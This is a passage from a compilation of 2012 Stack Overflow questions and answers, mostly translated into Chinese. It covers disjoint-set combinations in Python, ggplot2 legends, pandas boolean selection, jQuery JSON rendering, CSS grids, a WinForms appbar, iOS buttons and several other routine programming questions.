无效的情况，例如组合 [[1, 2, 3], [3, 6, 8]] 因为 3 在两个元素中是常见的。有什么优雅的方法可以做到这一点吗？我将非常感谢任何反馈。

我还必须说明我不想执行 powerset 函数，因为初始列表可能有相当多的元素（正如我所说的 n 可以达到 40000），并且使用这么多元素的 powerset 永远不会完成.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:30:44.550

我会使用发电机：

```
import itertools

def comb(seq):
   for n in range(1, len(seq)):
      for c in itertools.combinations(seq, n): # all combinations of length n
         if len(set.union(*map(set, c))) == sum(len(s) for s in c): # pairwise disjoint?
            yield list(c)

for c in comb([[1, 2, 3], [3, 6, 8], [4, 9], [6, 11]]):
   print c 
```

这会产生：

```
[[1, 2, 3]]
[[3, 6, 8]]
[[4, 9]]
[[6, 11]]
[[1, 2, 3], [4, 9]]
[[1, 2, 3], [6, 11]]
[[3, 6, 8], [4, 9]]
[[4, 9], [6, 11]]
[[1, 2, 3], [4, 9], [6, 11]] 
```

如果您需要将结果存储在单个列表中：

```
print list(comb([[1, 2, 3], [3, 6, 8], [4, 9], [6, 11]])) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-26T22:04:22.507

下面是一个递归生成器：

```
def comb(input, lst = [], lset = set()):
   if lst:
      yield lst
   for i, el in enumerate(input):
      if lset.isdisjoint(el):
         for out in comb(input[i+1:], lst + [el], lset | set(el)):
            yield out

for c in comb([[1, 2, 3], [3, 6, 8], [4, 9], [6, 11]]):
   print c 
```

在许多集合具有共同元素的情况下，这可能比其他解决方案更有效（当然，在最坏的情况下，它仍然必须遍历`2**n`powerset 的元素）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-27T02:39:08.933

下面程序中使用的方法类似于之前的几个答案，排除了不相交的集合，因此通常不会测试所有组合。它与以前的答案不同，它尽可能早地贪婪地排除所有集合。这使其运行速度比 NPE 的解决方案快几倍。这是两种方法的时间比较，使用的输入数据包含 200、400、... 1000 个大小为 6 的集合，其中元素范围为 0 到 20：

```
Set size =   6,  Number max =  20   NPE method
  0.042s  Sizes: [200, 1534, 67]
  0.281s  Sizes: [400, 6257, 618]
  0.890s  Sizes: [600, 13908, 2043]
  2.097s  Sizes: [800, 24589, 4620]
  4.387s  Sizes: [1000, 39035, 9689]

Set size =   6,  Number max =  20   jwpat7 method
  0.041s  Sizes: [200, 1534, 67]
  0.077s  Sizes: [400, 6257, 618]
  0.167s  Sizes: [600, 13908, 2043]
  0.330s  Sizes: [800, 24589, 4620]
  0.590s  Sizes: [1000, 39035, 9689] 
```

在上面的数据中，左列显示了以秒为单位的执行时间。数字列表显示发生了多少单、双或三联合。程序中的常量指定数据集的大小和特征。

```
#!/usr/bin/python
from random import sample, seed
import time
nsets,   ndelta,  ncount, setsize  = 200, 200, 5, 6
topnum, ranSeed, shoSets, shoUnion = 20, 1234, 0, 0
seed(ranSeed)
print 'Set size = {:3d},  Number max = {:3d}'.format(setsize, topnum)

for casenumber in range(ncount):
    t0 = time.time()
    sets, sizes, ssum = [], [0]*nsets, [0]*(nsets+1);
    for i in range(nsets):
        sets.append(set(sample(xrange(topnum), setsize)))

    if shoSets:
        print 'sets = {},  setSize = {},  top# = {},  seed = {}'.format(
            nsets, setsize, topnum, ranSeed)
        print 'Sets:'
        for s in sets: print s

    # Method by jwpat7
    def accrue(u, bset, csets):
        for i, c in enumerate(csets):
            y = u + [c]
            yield y
            boc = bset|c
            ts = [s for s in csets[i+1:] if boc.isdisjoint(s)]
            for v in accrue (y, boc, ts):
                yield v

    # Method by NPE
    def comb(input, lst = [], lset = set()):
        if lst:
            yield lst
        for i, el in enumerate(input):
            if lset.isdisjoint(el):
                for out in comb(input[i+1:], lst + [el], lset | set(el)):
                    yield out

    # Uncomment one of the following 2 lines to select method
    #for u in comb (sets):
    for u in accrue ([], set(), sets):
        sizes[len(u)-1] += 1
        if shoUnion: print u
    t1 = time.time()
    for t in range(nsets-1, -1, -1):
        ssum[t] = sizes[t] + ssum[t+1]
    print '{:7.3f}s  Sizes:'.format(t1-t0), [s for (s,t) in zip(sizes, ssum) if t>0]
    nsets += ndelta 
```

*编辑：*在 function`accrue`中，参数`(u, bset, csets)`的使用如下：
• u = 当前集合并集中的集合列表 • bset
= "big set" = u 的平面值 = 已使用的元素
• csets = 候选集 = 符合条件的集合列表包括
注意，如果第一行`accrue`被替换，
`def accrue(csets, u=[], bset=set()):`
第七行被替换
`for v in accrue (ts, y, boc):`
（即，如果参数被重新排序并且为 u 和 bset 提供默认值），那么`accrue`可以调用 via`[accrue(listofsets)]`以生成其兼容联合列表。

关于`ValueError: zero length field name in format`评论中提到的使用 Python 2.6 时发生的错误，请尝试以下操作。

```
# change:
    print "Set size = {:3d}, Number max = {:3d}".format(setsize, topnum)
# to:
    print "Set size = {0:3d}, Number max = {1:3d}".format(setsize, topnum) 
```

程序中的其他格式可能需要类似的更改（添加适当的字段编号）。请注意，[2.6](http://docs.python.org/2/whatsnew/2.6.html#pep-3101-advanced-string-formatting)页面中的新增功能说“对 str.format() 方法的支持已向后移植到 Python 2.6”。虽然它没有说明是否需要字段名称或数字，但它没有显示没有它们的示例。相比之下，任何一种方式都适用于 2.7.3。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-26T20:51:47.927

使用`itertools.combinations`,`set.intersection`和`for-else`循环：

```
from itertools import *
lis=[[1, 2, 3], [3, 6, 8], [4, 9], [6, 11]]
def func(lis):
    for i in range(1,len(lis)+1):
       for x in combinations(lis,i):
          s=set(x[0])
          for y in x[1:]:
              if len(s & set(y)) != 0:
                  break
              else:
                  s.update(y)    
          else:
              yield x

for item in func(lis):
    print item 
```

**输出：**

```
([1, 2, 3],)
([3, 6, 8],)
([4, 9],)
([6, 11],)
([1, 2, 3], [4, 9])
([1, 2, 3], [6, 11])
([3, 6, 8], [4, 9])
([4, 9], [6, 11])
([1, 2, 3], [4, 9], [6, 11]) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-27T01:05:17.990

类似于[NPE 的解决方案](https://stackoverflow.com/a/13573935/395321)，但它没有递归，它返回一个列表：

```
def disjoint_combinations(seqs):
    disjoint = []
    for seq in seqs:
        disjoint.extend([(each + [seq], items.union(seq))
                            for each, items in disjoint
                                if items.isdisjoint(seq)])
        disjoint.append(([seq], set(seq)))
    return [each for each, _ in disjoint]

for each in disjoint_combinations([[1, 2, 3], [3, 6, 8], [4, 9], [6, 11]]):
    print each 
```

结果：

```
[[1, 2, 3]]
[[3, 6, 8]]
[[1, 2, 3], [4, 9]]
[[3, 6, 8], [4, 9]]
[[4, 9]]
[[1, 2, 3], [6, 11]]
[[1, 2, 3], [4, 9], [6, 11]]
[[4, 9], [6, 11]]
[[6, 11]] 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-26T20:56:20.070

不使用 itertools 包的单行程序。这是您的数据：

```
lE={}
lE[0]=[1, 2, 3]
lE[1] = [3, 6, 8]
lE[2] = [4, 9]
lE[4] = [6, 11] 
```

这是单线：

```
results=[(lE[v1],lE[v2]) for v1 in lE for v2  in lE if (set(lE[v1]).isdisjoint(set(lE[v2])) and v1>v2)] 
```

# java - 访问 App Engine 拉取队列 - 激活 TaskQueue API

> ID：13572560
> 
> 赞同：2
> 
> 时间：2012-11-26T20:23:46.660
> 
> 标签：java, google-app-engine, google-api, pull-queue

我尝试使用 Google 示例代码 - Taskqueue-cmdline-sample 对 Google Queue API 进行身份验证，

您必须在示例的 client_secrets.json 文件中设置 google 客户端 ID 和 google 客户端密码。

所以我的问题是在那里使用哪些凭据以及如何获取它们！另外，我们必须在 GAE 中 queue.xml 的 ACL 中使用电子邮件地址，而不是客户端 ID...

~~您在文档中有一个链接指向那里获取客户端 ID/秘密：[http ://code.google.com/p/google-api-java-client/source/browse/shared/shared-sample-cmdline/ src/main/java/com/google/api/services/samples/shared/cmdline/oauth2/OAuth2Native.java?repo=samples](http://code.google.com/p/google-api-java-client/source/browse/shared/shared-sample-cmdline/src/main/java/com/google/api/services/samples/shared/cmdline/oauth2/OAuth2Native.java?repo=samples)~~

~~但它已经死了... (404)~~ --> 已修复

文档：[http ://samples.google-api-java-client.googlecode.com/hg/taskqueue-cmdline-sample/instructions.html](http://samples.google-api-java-client.googlecode.com/hg/taskqueue-cmdline-sample/instructions.html)

在那里查看示例：[http ://code.google.com/p/google-api-java-client/source/checkout](http://code.google.com/p/google-api-java-client/source/checkout)

## 更新

TaskQueue API 不在我的服务列表中。如何激活 TaskQueue API？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:55:14.843

感谢您提供有关文档的提示。它已相应更新。

client_secrets.json 的凭据来自开发者控制台。您可以按照以下步骤获取它们（现在在[文档](http://samples.google-api-java-client.googlecode.com/hg/taskqueue-cmdline-sample/instructions.html)中列出）：

*   访问[Google api 控制台](https://code.google.com/apis/console/?api=taskqueue)
*   如果这是您第一次，请单击“创建项目...”
*   否则，点击左上角“Google apis”标志下的下拉菜单，然后点击“Other projects”下的“Create...”
*   单击“API 访问”，然后单击“创建 OAuth 2.0 客户端 ID...”。
*   输入产品名称，然后单击“下一步”。
*   选择“已安装的应用程序”并单击“创建客户端 ID”。
*   在新创建的“已安装应用程序的客户端 ID”中，点击右侧的“下载 JSON”。稍后在查看示例项目后，您将把下载的文件（例如 ~/Downloads/client_secrets.json）复制到 src/main/resources/client_secrets.json。如果您跳过此步骤，则在尝试运行示例时，您将在浏览器中收到 400 INVALID_CLIENT 错误。

Note that the link used above and in the documentation automatically asks if you want to activate the TaskQueue API, which is necessary. If you manually go to the API console, be sure to go to the services tab and turn that API on yourself.

# r - ggplot2：图例中的虚线

> ID：13572572
> 
> 赞同：9
> 
> 时间：2012-11-26T20:24:50.560
> 
> 标签：r, ggplot2

我正在尝试使用两个叠加的密度图创建直方图。问题：我希望一个密度是一条虚线，它工作得很好，但在图例中，虚线不会出现，如下例所示

```
x<-sort(rnorm(1000))
data<-data.frame(x=x,Normal=dnorm(x,mean(x),sd=sd(x)),Student=dt(x,df=3))

ggplot(data,aes(y=x))+geom_histogram(aes(x=x,y=..density..),
color="black",fill="darkgrey")+geom_line(aes(x=x,y=Normal,color="Normal"),size=1,
linetype=2)+ylab("")+xlab("")+labs(title="Density estimations")+geom_line(aes(x=x,y=Student,color="Student"),size=1)+
scale_color_manual(values=c("Student"="black","Normal"="black")) 
```

任何想法如何获得图例中的虚线？

非常感谢你！

雷纳

![示例图](../Images/c7b8df921793579b3ae19e307dd8f59d.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-26T20:52:42.733

“ggplot”方式通常喜欢数据采用“长”格式，并带有单独的列来指定每种美学。在这种情况下，线型应该被解释为一种美学。处理这个问题的最简单方法是使用`reshape2`包将数据准备成适当的格式：

```
library(reshape2)
data.m <- melt(data, measure.vars = c("Normal", "Student"), id.vars = "x") 
```

然后修改您的绘图代码，使其看起来像这样：

```
ggplot(data,aes(y=x)) +
  geom_histogram(aes(x=x,y=..density..),color="black",fill="darkgrey") +
  geom_line(data = data.m, aes(x = x, y = value, linetype = variable), size = 1) +
  ylab("") +
  xlab("") +
  labs(title="Density estimations") 
```

结果是这样的：

![在此处输入图像描述](../Images/8794aa980e0f36743869f0339ace588b.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:47:02.810

您想将其重塑为长格式...使其更简单

```
x<-sort(rnorm(1000))
Normal=dnorm(x,mean(x),sd=sd(x))
Student=dt(x,df=3)
y= c(Normal,Student)
DistBn= rep(c('Normal', 'Student'), each=1000)
# don't call it 'data' that is an R command
df<-data.frame(x=x,y=y, DistBn=DistBn)

head(df)
          x           y DistBn
1 -2.986430 0.005170920 Normal
2 -2.957834 0.005621358 Normal
3 -2.680157 0.012126747 Normal
4 -2.601635 0.014864165 Normal
5 -2.544302 0.017179353 Normal
6 -2.484082 0.019930239 Normal   

ggplot(df,aes(x=x, y=y))+
  geom_histogram(aes(x=x,y=..density..),color="black",fill="darkgrey")+
  geom_line(aes(x=x,y=y,linetype=DistBn))+
  ylab("")+xlab("")+labs(title="Density estimations")+
  scale_color_manual(values=c("Student"="black","Normal"="black")) 
```

![绘图](../Images/3bff1379d89a8112ded0b9b6ff84d110.png)

# python - 使用“或”选择 pandas 中的数据

> ID：13572576
> 
> 赞同：4
> 
> 时间：2012-11-26T20:25:03.267
> 
> 标签：python, pandas

我有一个值数据框，我想探索异常值的行。我在下面编写了一个可以用该函数调用的`groupby().apply()`函数，它适用于高值或低值，但是当我想将它们组合在一起时会产生错误。我以某种方式弄乱了布尔`OR`选择，但我只能使用`&`. 任何建议，将不胜感激。

扎克cp

```
df = DataFrame( {'a': [1,1,1,2,2,2,2,2,2,2], 'b': [5,5,6,9,9,9,9,9,9,20] } )

#this works fine
def get_outliers(group):
    x = mean(group.b)
    y = std(group.b)
    top_cutoff =    x + 2*y
    bottom_cutoff = x - 2*y
    cutoffs = group[group.b > top_cutoff]
    return cutoffs

#this will trigger an error
def get_all_ outliers(group):
    x = mean(group.b)
    y = std(group.b)
    top_cutoff =    x + 2*y
    bottom_cutoff = x -2*y
    cutoffs = group[(group.b > top_cutoff) or (group.b < top_cutoff)]
    return cutoffs

#works fine    
grouped1 = df.groupby(['a']).apply(get_outliers)
#triggers error
grouped2 = df.groupby(['a']).apply(get_all_outliers) 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-26T20:41:45.083

您需要使用`|`而不是`or`. `and`and运算符在 Python 中是特殊的`or`，并且不能与 numpy 和 pandas 等试图在集合中逐元素应用它们的东西很好地交互。因此，对于这些上下文，他们重新定义了“按位”运算符`&`并`|`表示“与”和“或”。

# gwt - 从 DateItem 和 TimeItem 中删除前面的文本

> ID：13572583
> 
> 赞同：0
> 
> 时间：2012-11-26T20:25:22.297
> 
> 标签：gwt, smartgwt

我有一个开始和结束`DateItem`和`TimeItem`. 该`DateRange`控件没有提供我在 SmartGWT 中需要的东西，我更喜欢拥有单独的控件。

如何从`DateItem`and控件的开头删除文本`TimeItem`？

目前，它显示日期：**__** []

其中*_*是文本条目， [] 是日期选择器。

我想删除文本日期：

我尝试在 DateItem 构造函数中将标题设置为“”，但它不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:48:34.033

我回答了我自己的问题。您必须使用`.setShowTitle(false)`删除表单项的标题。

# javascript - Ajax 和 json 问题

> ID：13572586
> 
> 赞同：1
> 
> 时间：2012-11-26T20:25:26.677
> 
> 标签：javascript, jquery, html, json

我有一个小 ajax 调用将 json 数据加载到 DOM 中，但它不起作用。当我查看 net 选项卡时，我看到它已加载但实际页面上没有数据。它只是说[对象对象]

```
 $.getJSON('json/redstone.json', function(data) {
   var items = [];

   $.each(data, function(key, val) {
       items.push('<li id="' + key + '">' + val + '</li>');
   });

   $('<ul/>', {
      'class': 'my-new-list',
       html: items.join('')
      }).appendTo('body');
   }); 
```

这是我的 JSON

```
{
"allconfig": {
    "card.inserted": {
        "value": "Not Inserted",
            "type": "enum",
            "range": "",
            "clone": false,
            "archive": false,
            "access": "R"
    },
        "card.cisproc": {
        "value": "Processed",
            "type": "string",
            "range": "",
            "clone": false,
            "archive": false,
            "access": "R"
    },
        "card.mfgid": {
        "value": "",
            "type": "string",
            "range": "",
            "clone": false,
            "archive": false,
            "access": "R"
    }
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:32:02.523

`val`实际上是您的 JSON 数据中的一个对象。如果你`$.each`超过`data`，你只会得到`allconfig`元素。所以你可能想枚举一遍`data.allconfig`。

因此，您可能希望显示`val`'`value`属性，如下所示：

```
$.getJSON('json/redstone.json', function(data) {
var items = [];

$.each(data.allconfig, function(key, val) {
    items.push('<li id="' + key + '">' + val.value + '</li>');
});

$('<ul/>', {
   'class': 'my-new-list',
    html: items.join('')
   }).appendTo('body');
}); 
```

这是一个工作的[jsFiddle](http://jsfiddle.net/Ybjgr/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:35:47.790

您可以尝试的另一种方法是使用常规 javascript 迭代来迭代 JSON 对象，如下所示：

```
for(var key in data){
    var value = data[key];
    items.push('<li id="' + key + '">' + value + '</li>');
} 
```

**编辑**：我刚刚意识到你的数据结构，正如评论中有人指出的那样，有子对象或嵌套对象。我的方法本身仅适用于第一级键：值对。如果你想让你的迭代函数更通用一点，你可以使用递归来正确地遍历你的结构，如下所示：

```
function buildData(data){
    for(var key in data){
        var value = data[key];
        if(typeof(value) == "object"){
          nestedData = buildData(value);
          items.push('<li id="' + key + '">' + nested + '</li>');
          // I'm not sure how you want to handle your nested objects, so place
          // here what you need and whatever else you need to do to handle
          // your nested object situation.
        }else{
            items.push('<li id="' + key + '">' + value + '</li>');
        }
    }
} 
```

# html - 将 CSS 网格用于 Web 应用程序（不是网站）是一种好习惯吗？

> ID：13572590
> 
> 赞同：0
> 
> 时间：2012-11-26T20:25:38.100
> 
> 标签：html, css, interface

我正在开发一个 Web 应用程序，它不是像博客、新闻页面或任何其他内容重要的页面那样的信息处理网站。我正在开发一个作为工具的应用程序，因此将具有多个界面元素：数据网格、按钮、输入字段等。

一位设计师告诉我，使用“css 网格框架”来根据一些网格进行设计是一个很好的做法，但是我有疑问，因为如果我正确理解网格，我会很困惑地说每列 40px，如果我有 2 x 15px 按钮，然后我将很难将它们全部放在 40px 的“单元格”中......

在我看来，网格浪费了大量空间，对大块信息有好处，但对很多小元素却没有……我说得对吗？

请让我知道使用网格是否总是一种好习惯，或者是否存在实际好的旧像素逐像素更好的情况。如果我错了，请向我介绍一些好的网站，该网站将解释如何正确使用网格。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:29:26.423

960 网格的全部意义在于它为您提供了大量的可整除因子以允许多**列**。它们只是简化操作的指南。

您选择在这些列中添加什么取决于您。您的按钮不需要符合网格。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:39:51.213

我可以说，根据我的经验，网格系统使设计和开发变得更加容易。从设计的角度来看，更容易知道事情需要在哪里以及如何排列，然后当您将设计传递给开发人员时，他或她只需将设计插入网格，一切都会按预期布局。

一个很好的应用程序和网站网格框架是 Twitter 的 Bootstrap。查看[脚手架页面](http://twitter.github.com/bootstrap/scaffolding.html#gridSystem)，您可以看到它提供了固定网格布局和响应式布局。我更喜欢响应式布局，但我构建的是网站而不是 Web 应用程序。它也很棒，因为它内置了适合网格的按钮样式，一个加载了有用且易于访问的功能的 JS 库和一个强大的支持网络。

您可能想要查看的其他网格系统是：

[960.gs](http://960.gs/)、[蓝图](http://www.blueprintcss.org/)和[1140 CSS 网格](http://cssgrid.net/)。您还可以谷歌搜索网格生成器来创建您自己的自定义布局。

选择一个适合您和您将与之合作的设计师，您的生活会轻松得多。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-26T21:14:36.877

要回答您的问题，“使用网格总是一个好习惯？” 这是一个相当开放的问题（也是它不适合 SO 的原因之一），但这是我的两分钱：

**A）**如果快速和肮脏的 UI 不仅很好，而且是预期和需要的（例如，对于一些不经常运行的内部功能），那么就去老派并一起转储一些有效的东西。

**B）**如果您正在开发一个“公众”或相当数量的非技术用户将利用的应用程序，那么您真的应该至少尝试为每个视图创建一致的布局，这就是像 960 或Twitter Bootstrap 大放异彩。从个人经验来看，Bootstrap 让我很容易让我的导航控件、数据网格、输入表单等在页面中正确排列和定位。

[UX Stack Exchange](https://ux.stackexchange.com/)站点可以让您更好地了解何时/为什么使用网格，并且实际上可能更适合这个问题......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-26T20:34:22.450

看看[http://grids.heroku.com/](http://grids.heroku.com/)它是一个生成固定或灵活网格的简单工具。如果您想了解网格的工作原理，一个简单而流行的网格系统是[http://960.gs](http://960.gs)

# c# - Windows forms MenuStrip DropDown inside a desktop application bar

> ID：13572591
> 
> 赞同：2
> 
> 时间：2012-11-26T20:25:41.453
> 
> 标签：c#, winforms, winforms-interop

This is a duplicate of a question I posted at Windows Dev Center. Still awaiting replies, so I thought I would try it here. My apologies if the formatting goes awry.

This is currently being written and debugged using Windows 7 Professional, SP1.

The application is located at the top of the desktop, and the working area is appropriately resized via a hook into the SystemParametersInfo function. The MenuStrip appears as it should, with the exception that any dropdown from the MenuStrip shows as detached from the MenuStrip itself (as if it is being drawn on the new working area, as opposed to the form containing the MenuStrip). For example:

*   Application TopLevel: true
*   Application Height: 150
*   Application Location: 0,0 on Desktop (prior to working area's resize)
*   MenuStrip Height: 25
*   MenuStrip Location: 0,0 inside Parent Form
*   MenuStrip DropDown Location: x,2 (where x is a valid and acceptable value) *this is being drawn on the resized working area (i.e. beneath the form)*

I have attempted correcting this with a custom Renderer to no present avail. I tried to override WndProc (as follows) so as to see what exactly was occurring, but that resulted in a stackoverflow halfway through drawing the application.

```
protected override void WndProc(ref Message m)
{
    if (mainForm.Visible)
    {
        MessageBox.Show("ID: " + m.Msg.ToString() + "\n" + m.ToString());
    }
    base.WndProc(ref m);
} 
```

I suspect I've run this into the ground by now, but if you require any further explanation, just let me know. Just hoping someone can point me in the appropriate direction as to where I should look.

* * *

Hopefully this will answer the question regarding why I used SystemParametersInfo:

```
 #region TEMPORARY FIX TO ACHIEVE APPBAR
    public RECT normalWorkingRECT = new RECT();
    public RECT newWorkingRECT = new RECT();

    public struct RECT
    {
        public int left;
        public int top;
        public int right;
        public int bottom;
    };

    [DllImport("user32.dll", EntryPoint="SystemParametersInfo")]
    public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, ref RECT pvParam, uint fWinIni);

    //call after scale is set
    private void setAppBar()
    {
        //make the parent = the desktop
        if (!this.GetTopLevel())
        {
            this.SetTopLevel(true);
        }
        this.Width = SystemInformation.PrimaryMonitorSize.Width;

        //set old Working Area
        SystemParametersInfo(0x0030, 0, ref normalWorkingRECT, 0);

        //change work area based on size of main form
        newWorkingRECT.left = normalWorkingRECT.left;
        newWorkingRECT.top = normalWorkingRECT.top + this.DesktopBounds.Height + 4;
        newWorkingRECT.right = normalWorkingRECT.right;
        newWorkingRECT.bottom = normalWorkingRECT.bottom;
        SystemParametersInfo(0x002F, 0, ref newWorkingRECT, 0x0002);
    }

    //called on close
    private void unsetAppBar()
    {
        //get current work area to compare
        RECT testRECT = new RECT();
        SystemParametersInfo(0x0030, 0, ref testRECT, 0);
        //if no change, resize to normal working rect
        if (newWorkingRECT.top == testRECT.top &&
            newWorkingRECT.bottom == testRECT.bottom &&
            newWorkingRECT.left == testRECT.left &&
            newWorkingRECT.right == testRECT.right)
        {
            SystemParametersInfo(0x002F, 0, ref normalWorkingRECT, 0x0002);
        }
        //if there is a change, resize to current working rect - this.height
        else
        {
            testRECT.top -= this.DesktopBounds.Height + 4;
            SystemParametersInfo(0x002F, 0, ref testRECT, 0x0002);
        }

    }
    #endregion 
```

![Cropped Screenshot of the issue.](../Images/9d80126476dec5c5746345c115aaffc3.png)

EDIT: Added image as requested and code to show reason for SystemParametersInfo.

# objective-c - iOS 从 viewcontroller.m 添加一个按钮

> ID：13572593
> 
> 赞同：-3
> 
> 时间：2012-11-26T20:25:55.180
> 
> 标签：objective-c, ios, xcode, button

所以，我一直在努力学习 iOS 的 Objective-C 编程的基础知识。现在我需要在框架中放置一个简单的按钮以及一个标签。我得到了标签，但我不确定按钮代码有什么问题。

编码：

```
UILabel *label = [[UILabel alloc] initWithFrame:CGRectMake(25, 25, 275, 60)];
label.text = test;//@"I am learning Objective-C for the\n very first time!";
label.numberOfLines = 0;
label.lineBreakMode = UILineBreakModeWordWrap;
//label.lineBreakMode = NSLineBreakByWordWrapping; //iOS 6 only
[self.view addSubview:label];

UIButton *button = [[UIButton alloc] initWithFrame:CGRectMake(25, 100, 275, 40)];
button.titleLabel.text = @"Hello";
[self.view addSubview:button]; 
```

按钮不显示...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:37:48.840

创建按钮的典型方法是：

```
 UIButton *btn = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    [btn setTitle:@"Hello" forState:UIControlStateNormal];
    btn.frame = CGRectMake(25, 100, 275, 40);
    [btn addTarget:self action:@selector(someMethod:) forControlEvents:UIControlEventTouchUpInside];
    [self addSubview:btn]; 
```

那么`someMeothod:`将是：

```
- (void)someMethod:(UIButton *)sender {
    // handle button press
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:30:06.570

点表示法可能有问题。使用它来设置标题：

```
 [button setTitle:@"myTitle" forState:UIControlStateNormal]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:35:22.947

试试这个：

```
 UIButton *myButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
myButton.frame=CGRectMake(0, 0, 40, 30);
[myButton setTitle:@"normal" forState:UIControlStateNormal];
[myButton setTitle:@"selected" forState:UIControlStateSelected];
myButton.titleLabel.textColor=[UIColor blackColor];
[self.view addSubview:myButton]; 
```

# android - android MyLocationOverlay stop GPS onPause

> ID：13572595
> 
> 赞同：0
> 
> 时间：2012-11-26T20:26:00.707
> 
> 标签：android, memory-management, gps

Im using MyLocationOverlay to get my location. But i would like to stop GPS onPause and resume it onResume. How can i do that ?

I know for LocationManager is method removeUpdates...

```
final MyLocationOverlay myLocationOverlay = new MyLocationOverlay(this, mapView);
myLocationOverlay.enableMyLocation();
mapView.getOverlays().add(myLocationOverlay); 

locButton.setOnClickListener(new View.OnClickListener() {

    public void onClick(View v) {
        // TODO Auto-generated method stub
        myLocationOverlay.runOnFirstFix(new Runnable() {

            public void run() {
                // TODO Auto-generated method stub
                mapView.getController().animateTo(myLocationOverlay.getMyLocation());
            }
        });{

        }
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:43:02.483

在您暂停的活动中：

```
@Override public void onPause() {
    myLocationOverlay.disableMyLocation();
    super.onPause();
}
@Override public void onResume() {
    myLocationOverlay.enableMyLocation();
    super.onResume();
} 
```

但我还没有编译。来自[https://developers.google.com/maps/documentation/android/reference/com/google/android/maps/MyLocationOverlay](https://developers.google.com/maps/documentation/android/reference/com/google/android/maps/MyLocationOverlay)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:43:37.143

[`MyLocationOverlay`](https://developers.google.com/maps/documentation/android/reference/com/google/android/maps/MyLocationOverlay)创建对象时保留对对象的引用，并分别使用和中的`enableMyLocation()`和`disableMylocation()`方法。根据您设置代码的方式，您可能需要在调用叠加层上的任何内容之前进行检查。`onResume()``onPause()``null`

# c# - 如何通过 Visual Studio 插件获取 Visual Studio 项目（在解决方案资源管理器中加载）位置？

> ID：13572598
> 
> 赞同：0
> 
> 时间：2012-11-26T20:26:06.450
> 
> 标签：c#, visual-studio, add-in

我正在使用 C# 开发一个 Visual Studio 插件。我想使用我也加载的插件来确定在 Visual Studio 中加载的解决方案或项目在文件系统上的位置。

请建议我该怎么做？指向任何资源的指针都会有所帮助。

谢谢

史蒂夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T22:29:01.290

在 System.IO.Path 命名空间中使用 GetDirectoryName 函数应该可以满足您的需求。

```
public String SolutionPath()
{
    return Path.GetDirectoryName(_applicationObject.Solution.FullName);
} 
```

这也在这里得到了回答... [Visual Studio addin - 查找当前解决方案文件夹路径](https://stackoverflow.com/questions/633985/visual-studio-addin-finding-current-solution-folder-path)

# jquery - Dynamic name to underscore js template is causing problems

> ID：13572601
> 
> 赞同：0
> 
> 时间：2012-11-26T20:26:15.497
> 
> 标签：jquery, backbone.js, underscore.js

I have this code in backbone.js:

```
render: function(type) {
  var html = _.template($('#book-page-template-type-'+type).html(), this.model.toJSON());
  this.$el.html(html); 
  return this;
} 
```

Were the type dynamically creates different versions of a web form template. That works great and I can render the view successfully.

**But** when I am trying to save changes made in the view to the server:

```
 save: function(){
  var text = this.$("#page-title").val();
  var content = this.$("#page-content").val();
  this.model.set({"title":text,"content":content});
  this.model.save();
} 
```

I am getting this error:

> Error: Syntax error, unrecognized expression: #book-page-template-type-[object Object]

Which obviously refers to the template name. (BTW the error is coming from jQuery).

Why is that happening ?

# javascript - How to upgrade JSLint in Aptana?

> ID：13572602
> 
> 赞同：1
> 
> 时间：2012-11-26T20:26:21.157
> 
> 标签：javascript, eclipse, aptana, jslint

I am using the Aptana plugin for eclipse - how to I upgrade the JSLint version being used to validate my JavaScript code?

It is complaining about my 'use strict" statement saying: "expected an assignment or function call and instead saw an expression"

Thanks in advance.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-09T12:41:22.327

如果您已经在使用 Aptana 步骤来配置 jslint：

1.  转到窗口 > 首选项 > 搜索验证
2.  在这里，您将获得 JSLint 验证器，只需激活并重建您的项目。

与 eclipse 类似，每当您编辑 js 文件时，都会执行“ctrl + shift + f”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-05T17:16:47.053

我无法让它发挥作用，但无论如何我都会分享我发现的东西，以防它指向正确的方向。

如果您查看 Eclipse 插件目录（可能是 HOME/.eclipse），您会发现 com.aptana.editor.js_${VERSION}.jar。在这个 JAR 中是 JSLint 的一个版本（名为 fulljslint.js）。我尝试用最新版本更新 JAR 中的这个文件，但我发现 JSLint 在 Eclipse 中的行为没有任何区别。似乎是从其他地方获取 JSLint 源代码......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T16:22:51.760

在 Aptana Studio 3 中，您可以设置单独的 JSLint 选项。我就是这样做的。

打开首选项并转到：

Aptana Studio -> 验证

选择 JSLint 验证器

然后，您将看到一个文本框，其中包含在 JSON 中定义的选项。

您需要添加的选项是“sloppy”：true

然后当然单击应用或确定以保存更改。

查看 JSLint 网站以获取您可以设置的所有选项的列表。

